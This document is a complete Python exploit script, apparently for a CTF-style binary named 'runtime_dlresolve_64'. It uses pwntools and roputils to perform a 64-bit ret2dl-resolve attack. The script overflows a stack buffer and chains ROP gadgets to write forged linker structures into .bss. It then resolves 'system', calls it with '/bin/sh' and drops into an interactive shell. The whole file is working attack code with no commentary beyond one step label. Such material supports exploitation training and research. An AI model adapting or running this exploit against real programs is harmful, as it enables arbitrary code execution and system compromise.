#!/usr/bin/env python
#coding:utf-8
#import sys
import roputils
from pwn import *

context.log_level = "debug"
elf = ELF("./runtime_dlresolve_64")
offset = 0x10+8
read_got = elf.plt["read"]
vulFunc = 0x0000000000400566
pop_rdi_ret = 0x0000000000400603
pop_rsir15_ret = 0x0000000000400601
 
p = process('./runtime_dlresolve_64')
 
rop = roputils.ROP('./runtime_dlresolve_64')
addr_stage = rop.section('.bss')
ptr_ret = rop.search(rop.section('.fini'))
 
# step1 : write sh & resolve struct to bss
buf = rop.fill(offset)
buf += p64(pop_rdi_ret) + p64(0) + p64(pop_rsir15_ret) + p64(addr_stage) + p64(0) + p64(read_got) + p64(vulFunc)
p.send(buf)
buf = ""
buf += rop.dl_resolve_call(addr_stage+210)
buf += rop.fill(210, buf)
buf += rop.dl_resolve_data(addr_stage+210, 'system')
buf += rop.fill(310, buf)
buf += rop.string('/bin/sh')
buf += rop.fill(350, buf)
p.send(buf)
buf = rop.fill(offset)
buf += p64(pop_rdi_ret) + p64(addr_stage+310)
buf += p64(ptr_ret)
p.send(buf)
p.interactive()
